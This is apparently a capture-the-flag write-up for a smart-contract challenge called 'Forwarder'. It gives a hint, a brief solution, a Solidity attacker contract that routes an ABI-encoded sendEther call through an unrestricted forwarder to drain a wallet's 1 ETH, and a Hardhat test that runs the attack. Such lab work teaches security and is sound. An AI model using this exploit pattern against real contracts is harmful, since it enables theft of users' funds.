# Forwarder

## Goals

=> Steal the 1 ETH from the wallet and transfer to the attacker Wallet

### Hints

- Business logic errors (and ABI encoding Prerequisite)

### Solution

- We can just make a low level call to the forwarder which will then call the wallet and send us the ether if we setup the data correct for the low level call going from the Forwarder contract to the wallet

### Attacker Contract

```solidity
contract ForwarderAttacker {
    Forwarder forwarder;
    Wallet wallet;

    constructor(address _forwarder, address _wallet) {
        forwarder = Forwarder(_forwarder);
        wallet = Wallet(_wallet);
    }

    function attack(address destination, uint256 amount) external {
        bytes memory data = abi.encodeWithSignature(
            "sendEther(address,uint256)",
            destination,
            amount
        );
        forwarder.functionCall(address(wallet), data);
    }
}
```

### Test

```javascript
it('conduct your attack here', async () => {
	const AttackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
	const attackerContract = await AttackerFactory.connect(attackerWallet).deploy(
		forwarderContract.address,
		walletContract.address
	);
	await attackerContract
		.connect(attackerWallet)
		.attack(attackerWallet.address, ethers.utils.parseEther('1'));
});
```
